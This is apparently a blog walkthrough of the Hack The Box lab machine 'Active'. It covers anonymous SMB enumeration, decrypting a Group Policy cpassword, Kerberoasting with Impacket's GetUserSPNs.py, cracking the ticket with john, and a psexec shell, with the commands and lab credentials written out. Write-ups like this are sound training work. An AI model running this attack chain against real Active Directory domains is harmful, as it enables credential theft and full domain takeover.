---
title:     "Hack The Box - Active"
tags: [windows,easy,smb,kerberos,psexec]
layout: post
---


![73f757b7fcd980b15078520b34f12dd2.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-active/74a132f10e0d4e0797bf934c20a1a352.png)

We are going to pwn Active from Hack The Box.

Link: <https://www.hackthebox.eu/home/machines/profile/148>

Let's Begin with our Initial Nmap Scan.

## Nmap Scan Results:

```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5722/tcp  open  msdfsr
9389/tcp  open  adws
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49169/tcp open  unknown
49171/tcp open  unknown
49182/tcp open  unknown
```
There are many ports open, let's start with `SMB`

## SMB:

I logged in without the password.
```
root@w0lf:~# smbclient -L 10.10.10.100 
Enter WORKGROUP\root's password: 
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Replication     Disk      
	SYSVOL          Disk      Logon server share 
	Users           Disk      
SMB1 disabled -- no workgroup available
```
Let's check what's inside them.

It seems like I only have access to `Replication`
>smbclient //10.10.10.100/Replication

```
root@w0lf:~# smbclient //10.10.10.100/Replication
Enter WORKGROUP\root's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 21 16:07:44 2018
  ..                                  D        0  Sat Jul 21 16:07:44 2018
  active.htb                          D        0  Sat Jul 21 16:07:44 2018

		10459647 blocks of size 4096. 4922655 blocks available
```
```
smb: \> cd active.htb
smb: \active.htb\> ls
  .                                   D        0  Sat Jul 21 16:07:44 2018
  ..                                  D        0  Sat Jul 21 16:07:44 2018
  DfsrPrivate                       DHS        0  Sat Jul 21 16:07:44 2018
  Policies                            D        0  Sat Jul 21 16:07:44 2018
  scripts                             D        0  Thu Jul 19 00:18:57 2018

		10459647 blocks of size 4096. 4922655 blocks available
smb: \active.htb\> 
```

I downloaded all the files in the box to my machine using `smbget`.
```
root@w0lf:~/CTF/HTB/Boxes/Active# smbget -R smb://10.10.10.100/Replication/
Password for [root] connecting to //Replication/10.10.10.100: 
Using workgroup WORKGROUP, user root
smb://10.10.10.100/Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI                                                                                                                                            
smb://10.10.10.100/Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI                                                                                                                               
smb://10.10.10.100/Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf                                                                                                   
smb://10.10.10.100/Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml                                                                                                              
smb://10.10.10.100/Replication//active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol                                                                                                                               
smb://10.10.10.100/Replication//active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI                                                                                                                                            
smb://10.10.10.100/Replication//active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf                                                                                                   
Downloaded 8.11kB in 33 seconds
```

I found a Interesting file `Groups.xml` in `\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\`

That file contains username and an encrypted password. It's a GPP Password.
![sample.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-active/24959afb5d6e44d98d32b8dcaec80e67.png)


There is a tool in kali `gpp-decrypt` to crack this password.
To know more about what is `cpassword` and `GPP`, you can read [here](https://adsecurity.org/?p=2288).
```
root@w0lf:~/CTF/HTB/Boxes/Active/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups# gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
/usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is deprecated
GPPstillStandingStrong2k18
```
So the password is `GPPstillStandingStrong2k18`.

## User:

I logged in as `SVC_TGS : GPPstillStandingStrong2k18`
```
root@w0lf:~/CTF/HTB/Boxes/Active# smbclient //10.10.10.100/Users -U "SVC_TGS"
Enter WORKGROUP\SVC_TGS's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sat Jul 21 20:09:20 2018
  ..                                 DR        0  Sat Jul 21 20:09:20 2018
  Administrator                       D        0  Mon Jul 16 15:44:21 2018
  All Users                         DHS        0  Tue Jul 14 10:36:44 2009
  Default                           DHR        0  Tue Jul 14 12:08:21 2009
  Default User                      DHS        0  Tue Jul 14 10:36:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 10:27:55 2009
  Public                             DR        0  Tue Jul 14 10:27:55 2009
  SVC_TGS                             D        0  Sat Jul 21 20:46:32 2018

		10459647 blocks of size 4096. 4922639 blocks available
```

Got User Flag:<br/>
![032652c6512aa3dc46398b218303cf90.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-active/8b2e0f9b19b241a28faf4d16ab74a337.png)

## Kerberosting:

We know port 88 is open, so we can move on to the kerberosting technique.

### Step 1:

First we need to get administrator Kerberos ticket. For that we can use `GetUserSPNs.py` from [impacket](https://github.com/SecureAuthCorp/impacket).
>GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS

![edacd9dbbaaf65bf047828e5b08df799.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-active/1be013c86ce44243b7ec30f8b61116d6.png)
Now we can crack this using `john`.

### Step 2:

Cracking the ticket using `john`<br/>
![033afd7f0ad9118331aaa540749471a9.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-active/797ea49a2e2846c4a38b012202d15e11.png)<br/>
And we got the administrator password : `Ticketmaster1968`

## Getting system Shell:

I can get a shell with PSExec which is also from Impacket.
![f56036627caa1deb8121811a74e7e25e.png](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-active/59b5673a954140508edae991d29f4b71.png)

We own the root!!












